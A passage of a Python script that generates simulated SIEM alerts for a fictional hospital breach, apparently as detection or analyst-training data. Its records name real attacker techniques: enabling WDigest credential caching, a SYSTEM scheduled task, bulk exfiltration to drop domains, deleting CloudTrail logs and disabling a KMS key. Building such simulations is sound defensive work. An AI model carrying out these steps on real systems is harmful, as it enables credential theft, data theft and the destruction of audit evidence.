        raw_log=d["raw"]
    ))

# Additional lateral movement to more hospital systems
extra_lateral2 = [
    {"offset": 39, "user": "dr.smith@mercy-hospital.org", "host": "SURGERY-SCHED-01", "raw": {"reason": "First-time access to surgical scheduling", "normal_access": False}},
    {"offset": 44, "user": "admin.chen@mercy-hospital.org", "host": "BACKUP-SRV-01", "raw": {"reason": "Admin accessing backup server from unusual source", "source_ip": "10.10.50.88"}},
    {"offset": 51, "user": "billing.patel@mercy-hospital.org", "host": "INSURANCE-GW-01", "raw": {"reason": "Bulk query to insurance gateway", "records_queried": 15000}},
    {"offset": 54, "user": "lab.tech.wong@mercy-hospital.org", "host": "IMAGING-SRV-01", "raw": {"reason": "DICOM server access from lab account", "protocol": "DICOM", "studies_accessed": 342}},
    {"offset": 58, "user": "admin.chen@mercy-hospital.org", "host": "VOIP-SRV-01", "raw": {"reason": "PBX admin access attempt", "action": "call_records_export"}},
]
for l in extra_lateral2:
    alerts.append(alert(
        offset=l["offset"], product="CrowdStrike", event_type="suspicious_signin",
        user=l["user"], severity="HIGH",
        ip=attacker_ip, hostname=l["host"],
        geo="DE", raw_log=l["raw"]
    ))

# Additional privilege escalation
extra_priv2 = [
    {"offset": 62, "raw": {"action": "CreateScheduledTask", "task": "MercyBackup", "run_as": "SYSTEM", "target_host": "EHR-SERVER-01"}, "host": "DC-MAIN"},
    {"offset": 65, "raw": {"action": "ModifyRegistryKey", "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "value": "UseLogonCredential=1"}, "host": "EHR-SERVER-01"},
    {"offset": 68, "raw": {"action": "AddToGroup", "group": "Backup Operators", "target_user": "admin.chen"}, "host": "DC-MAIN"},
]
for p in extra_priv2:
    alerts.append(alert(
        offset=p["offset"], product="Defender", event_type="privilege_escalation",
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip=attacker_ip, hostname=p["host"],
        geo="DE", raw_log=p["raw"]
    ))

# Additional exfiltration via different channels
extra_exfil2 = [
    {"offset": 99, "bytes": 367001600, "dest_ip": "103.75.201.4", "raw": {"protocol": "FTP", "dest_port": 21, "dest_domain": "ftp.anonymous-drop.cc"}},
    {"offset": 104, "bytes": 1887436800, "dest_ip": "103.75.201.4", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "pastebin-clone.io", "note": "patient PII"}},
    {"offset": 110, "bytes": 943718400, "dest_ip": "103.75.201.4", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "file-drop.xyz", "note": "medical imaging data"}},
]
for e in extra_exfil2:
    a = alert(
        offset=e["offset"], product="Cisco ASA", event_type="large_data_transfer",
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip="10.10.20.10", hostname="EHR-SERVER-01",
        raw_log={**e["raw"], "bytes_transferred": e["bytes"], "destination_ip": e["dest_ip"]}
    )
    a["target"]["hostname"] = e["dest_ip"]
    alerts.append(a)

# Additional cloud alerts
extra_cloud2 = [
    {"offset": 88, "type": "anomalous_api_call", "raw": {"action": "lambda:CreateFunction", "function": "exfil-processor", "runtime": "python3.9"}, "host": "AWS-Lambda"},
    {"offset": 95, "type": "anomalous_api_call", "raw": {"action": "s3:PutObject", "bucket": "external-staging-bucket", "key": "patient-records-batch-1.tar.gz", "size_gb": 4.2}, "host": "AWS-S3"},
    {"offset": 100, "type": "anomalous_api_call", "raw": {"action": "logs:DeleteLogGroup", "log_group": "/aws/cloudtrail/mercy-audit"}, "host": "AWS-CloudWatch"},
    {"offset": 106, "type": "anomalous_api_call", "raw": {"action": "kms:DisableKey", "key_alias": "mercy-encryption-key", "note": "attempting to disable encryption"}, "host": "AWS-KMS"},
]
for c in extra_cloud2:
    alerts.append(alert(
        offset=c["offset"], product="AWS GuardDuty", event_type=c["type"],
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip=attacker_ip, hostname=c["host"],
        geo="DE", raw_log=c["raw"]
    ))

# More benign noise
extra_noise2 = [
    {"offset": 7, "product": "Defender", "type": "benign_process", "user": "svc-scheduler@mercy-hospital.org", "sev": "LOW", "host": "SCHED-SRV-01", "raw": {"process": "TaskScheduler.exe", "action": "shift_assignment_update"}},
    {"offset": 19, "product": "CrowdStrike", "type": "benign_process", "user": "svc-imaging@mercy-hospital.org", "sev": "LOW", "host": "PACS-SRV-01", "raw": {"process": "dcm4chee.exe", "action": "dicom_store_complete", "studies": 12}},
    {"offset": 34, "product": "Okta", "type": "login_success", "user": "pharmacist.lee@mercy-hospital.org", "sev": "LOW", "host": "PHARM-WS-01", "raw": {"application": "PharmacyDispense Portal", "location": "Chicago, US", "mfa": "verified"}, "ip": "10.10.6.15", "geo": "US"},
    {"offset": 48, "product": "Defender", "type": "service_restart", "user": "svc-email@mercy-hospital.org", "sev": "LOW", "host": "EXCHANGE-SRV-01", "raw": {"service": "Microsoft Exchange Transport", "reason": "certificate_renewal"}},
    {"offset": 63, "product": "CrowdStrike", "type": "benign_process", "user": "svc-hr@mercy-hospital.org", "sev": "LOW", "host": "HR-APP-01", "raw": {"process": "workday-agent.exe", "action": "payroll_sync"}},
    {"offset": 79, "product": "Okta", "type": "login_success", "user": "surgeon.park@mercy-hospital.org", "sev": "LOW", "host": "WS-SURGEON-01", "raw": {"application": "Surgical Schedule", "location": "Chicago, US", "mfa": "biometric"}, "ip": "10.10.7.22", "geo": "US"},
    {"offset": 92, "product": "Defender", "type": "benign_process", "user": "svc-lab@mercy-hospital.org", "sev": "LOW", "host": "LAB-ANALYZER-01", "raw": {"process": "lablink.exe", "action": "result_upload", "tests_processed": 89}},
    {"offset": 105, "product": "CrowdStrike", "type": "service_restart", "user": "svc-network@mercy-hospital.org", "sev": "LOW", "host": "DNS-SRV-01", "raw": {"service": "Windows DNS", "reason": "zone_transfer_complete"}},
    {"offset": 114, "product": "Defender", "type": "benign_process", "user": "svc-compliance@mercy-hospital.org", "sev": "LOW", "host": "COMPLIANCE-SRV", "raw": {"process": "hipaa-audit.exe", "action": "daily_compliance_scan", "violations": 0}},
    {"offset": 119, "product": "Okta", "type": "login_success", "user": "nurse.kim@mercy-hospital.org", "sev": "LOW", "host": "WS-NURSE-03", "raw": {"application": "Patient Check-in", "location": "Chicago, US", "mfa": "push"}, "ip": "10.10.5.50", "geo": "US"},
    {"offset": 11, "product": "Defender", "type": "benign_process", "user": "svc-fax@mercy-hospital.org", "sev": "LOW", "host": "FAX-SRV-01", "raw": {"process": "faxservice.exe", "action": "incoming_fax", "pages": 3}},
    {"offset": 27, "product": "CrowdStrike", "type": "service_restart", "user": "svc-dns@mercy-hospital.org", "sev": "LOW", "host": "DNS-SRV-02", "raw": {"service": "Unbound DNS", "reason": "cache_flush"}},
    {"offset": 42, "product": "Okta", "type": "login_success", "user": "tech.davis@mercy-hospital.org", "sev": "LOW", "host": "WS-TECH-01", "raw": {"application": "IT Helpdesk Portal", "location": "Chicago, US", "mfa": "verified"}, "ip": "10.10.2.8", "geo": "US"},
    {"offset": 56, "product": "Defender", "type": "benign_process", "user": "svc-cert@mercy-hospital.org", "sev": "LOW", "host": "CA-SRV-01", "raw": {"process": "certsvc.exe", "action": "certificate_issued", "template": "WebServer"}},
    {"offset": 71, "product": "CrowdStrike", "type": "benign_process", "user": "svc-wifi@mercy-hospital.org", "sev": "LOW", "host": "WLC-01", "raw": {"process": "wlc-monitor.exe", "action": "rogue_ap_scan", "rogues_found": 0}},
    {"offset": 90, "product": "Okta", "type": "login_success", "user": "dietician.brown@mercy-hospital.org", "sev": "LOW", "host": "WS-DIET-01", "raw": {"application": "Nutrition Planning", "location": "Chicago, US", "mfa": "push"}, "ip": "10.10.8.3", "geo": "US"},
    {"offset": 108, "product": "Defender", "type": "service_restart", "user": "svc-siem@mercy-hospital.org", "sev": "LOW", "host": "SIEM-SRV-01", "raw": {"service": "Splunk Enterprise", "reason": "index_maintenance"}},
]
for n in extra_noise2:
    a = alert(
        offset=n["offset"], product=n["product"], event_type=n["type"],
        user=n["user"], severity=n["sev"],
        ip=n.get("ip", "10.10.1.1"), hostname=n["host"],
        geo=n.get("geo"), raw_log=n["raw"]
    )
    alerts.append(a)

# Sort by timestamp
alerts.sort(key=lambda x: x["metadata"]["event_timestamp"])

print(f"Total alerts generated: {len(alerts)}")

# Count by type
from collections import Counter
type_counts = Counter(a["metadata"]["event_type"] for a in alerts)
for t, c in sorted(type_counts.items(), key=lambda x: -x[1]):
    print(f"  {t}: {c}")

_out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sim1_healthcare_breach.json")
with open(_out, "w") as f:
    json.dump(alerts, f, indent=2)

print(f"\nFile written to {_out}")
